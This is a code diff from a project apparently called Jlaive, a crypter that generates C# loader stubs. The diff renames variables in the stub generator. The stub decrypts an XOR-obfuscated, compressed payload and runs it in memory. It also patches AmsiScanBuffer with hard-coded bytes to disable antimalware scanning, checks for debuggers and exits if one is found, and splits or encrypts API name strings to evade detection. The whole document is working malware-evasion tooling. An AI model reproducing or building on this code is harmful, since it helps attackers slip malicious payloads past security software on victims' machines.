@@ -23,14 +23,14 @@ namespace Jlaive
         {
             string namespacename = RandomString(10, rng);
             string classname = RandomString(10, rng);
-            string functionname = RandomString(10, rng);
-            string functionname2 = RandomString(10, rng);
-            string delegatename = RandomString(10, rng);
-            string delegatename2 = RandomString(10, rng);
+            string xorfunction = RandomString(10, rng);
+            string uncompressfunction = RandomString(10, rng);
+            string virtualprotect = RandomString(10, rng);
+            string checkremotedebugger = RandomString(10, rng);
             string key = RandomString(20, rng);
             string encrypted = Convert.ToBase64String(XORCrypt(Compress(pbytes), key));
-            string encrypted2 = Convert.ToBase64String(XORCrypt(Encoding.UTF8.GetBytes("AmsiScanBuffer"), key));
-            string encrypted3 = Convert.ToBase64String(XORCrypt(Encoding.UTF8.GetBytes("CheckRemoteDebuggerPresent"), key));
+            string amsiscanbuffer_str = Convert.ToBase64String(XORCrypt(Encoding.UTF8.GetBytes("AmsiScanBuffer"), key));
+            string checkremotedebugger_str = Convert.ToBase64String(XORCrypt(Encoding.UTF8.GetBytes("CheckRemoteDebuggerPresent"), key));
             return @"using System;
 using System.Diagnostics;
 using System.Text;
@@ -49,8 +49,8 @@ namespace " + namespacename + @"
         [DllImport(""kernel32.dll"")]
         static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
-        " + (bamsi ? $"delegate bool {delegatename}(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);" : string.Empty) + @"
-        " + (antidebug ? $"delegate bool {delegatename2}(IntPtr hProcess, ref bool isDebuggerPresent);" : string.Empty) + @"
+        " + (bamsi ? $"delegate bool {virtualprotect}(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);" : string.Empty) + @"
+        " + (antidebug ? $"delegate bool {checkremotedebugger}(IntPtr hProcess, ref bool isDebuggerPresent);" : string.Empty) + @"
 
         static string payload = """ + encrypted + @""";
 
@@ -59,17 +59,17 @@ namespace " + namespacename + @"
             " + (antidebug || bamsi ? @"IntPtr kmodule = LoadLibrary(""k"" + ""e"" + ""r"" + ""n"" + ""e"" + ""l"" + ""3"" + ""2"" + ""."" + ""d"" + ""l"" + ""l"");" : string.Empty) + @"
 
             " + (antidebug ?
-@"IntPtr crdpaddr = GetProcAddress(kmodule, Encoding.UTF8.GetString(" + functionname + @"(Convert.FromBase64String(""" + encrypted3 + @"""), """ + key + @""")));
-" + delegatename2 + @" CheckRemoteDebuggerPresent = (" + delegatename2 + @")Marshal.GetDelegateForFunctionPointer(crdpaddr, typeof(" + delegatename2 + @"));
+@"IntPtr crdpaddr = GetProcAddress(kmodule, Encoding.UTF8.GetString(" + xorfunction + @"(Convert.FromBase64String(""" + checkremotedebugger_str + @"""), """ + key + @""")));
+" + checkremotedebugger + @" CheckRemoteDebuggerPresent = (" + checkremotedebugger + @")Marshal.GetDelegateForFunctionPointer(crdpaddr, typeof(" + checkremotedebugger + @"));
 bool isDebuggerPresent = false;
 CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
 if (Debugger.IsAttached || isDebuggerPresent) Environment.Exit(1);" : string.Empty) + @"
 
             " + (bamsi ?
             @"IntPtr vpaddr = GetProcAddress(kmodule, ""V"" + ""i"" + ""r"" + ""t"" + ""u"" + ""a"" + ""l"" + ""P"" + ""r"" + ""o"" + ""t"" + ""e"" + ""c"" + ""t"");
-            " + delegatename + @" VirtualProtect = (" + delegatename + @")Marshal.GetDelegateForFunctionPointer(vpaddr, typeof(" + delegatename + @"));
+            " + virtualprotect + @" VirtualProtect = (" + virtualprotect + @")Marshal.GetDelegateForFunctionPointer(vpaddr, typeof(" + virtualprotect + @"));
             IntPtr amsimodule = LoadLibrary(""a"" + ""m"" + ""s"" + ""i"" + ""."" + ""d"" + ""l"" + ""l"");
-            IntPtr asbaddr = GetProcAddress(amsimodule, Encoding.UTF8.GetString(" + functionname + @"(Convert.FromBase64String(""" + encrypted2 + @"""), """ + key + @""")));
+            IntPtr asbaddr = GetProcAddress(amsimodule, Encoding.UTF8.GetString(" + xorfunction + @"(Convert.FromBase64String(""" + amsiscanbuffer_str + @"""), """ + key + @""")));
 
             byte[] patch;
             if (IntPtr.Size == 8) patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
@@ -79,10 +79,10 @@ if (Debugger.IsAttached || isDebuggerPresent) Environment.Exit(1);" : string.Emp
             Marshal.Copy(patch, 0, asbaddr, patch.Length);
             VirtualProtect(asbaddr, (UIntPtr)patch.Length, old, out old);" : string.Empty) + @"
 
-            Assembly.Load(" + functionname2 + @"(" + functionname + @"(Convert.FromBase64String(payload), """ + key + @"""))).EntryPoint.Invoke(null, new object[] { args[0].Split(' ') });
+            Assembly.Load(" + uncompressfunction + @"(" + xorfunction + @"(Convert.FromBase64String(payload), """ + key + @"""))).EntryPoint.Invoke(null, new object[] { args[0].Split(' ') });
         }
 
-        static byte[] " + functionname + @"(byte[] input, string key)
+        static byte[] " + xorfunction + @"(byte[] input, string key)
         {
             byte[] keyc = Encoding.UTF8.GetBytes(key);
             for (int i = 0; i < input.Length; i++)
@@ -92,7 +92,7 @@ if (Debugger.IsAttached || isDebuggerPresent) Environment.Exit(1);" : string.Emp
             return input;
         }
 
-        static byte[] " + functionname2 + @"(byte[] bytes)
+        static byte[] " + uncompressfunction + @"(byte[] bytes)
         {
             MemoryStream msi = new MemoryStream(bytes);
             MemoryStream mso = new MemoryStream();
